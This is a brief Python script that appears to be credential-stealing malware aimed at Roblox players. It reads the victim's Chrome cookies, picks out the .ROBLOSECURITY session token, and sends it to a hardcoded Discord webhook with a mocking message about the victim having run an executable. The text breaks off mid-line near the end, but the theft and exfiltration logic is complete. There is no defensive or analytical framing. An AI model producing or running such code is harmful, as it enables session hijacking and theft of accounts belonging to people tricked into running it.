import requests
import threading
import browser_cookie3 as cookie
from discord_webhook import DiscordWebhook, DiscordEmbed

webhook_urls = ['https://discordapp.com/api/webhooks/832050040289099847/HknwtRKQc_qBsXl3S-UtpGjbrWV_8g0QQMyUTdRoVNdsD9eIQqx1hUIgRszdPYkaqYb4', 'webhook url 2']

def getCookiesFromPc():
    req = requests.Session()
    cj = cookie.chrome()
    req.cookies = cj
    r = req.get("https://www.roblox.com/")
    for c in req.cookies:
        if c.name == ".ROBLOSECURITY":
            webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/832050040289099847/HknwtRKQc_qBsXl3S-UtpGjbrWV_8g0QQMyUTdRoVNdsD9eIQqx1hUIgRszdPYkaqYb4', content="@everyone")
            embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
            embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
            embed.set_timestamp('
            webhook.add_embed(embed)
            response = webhook.execute()
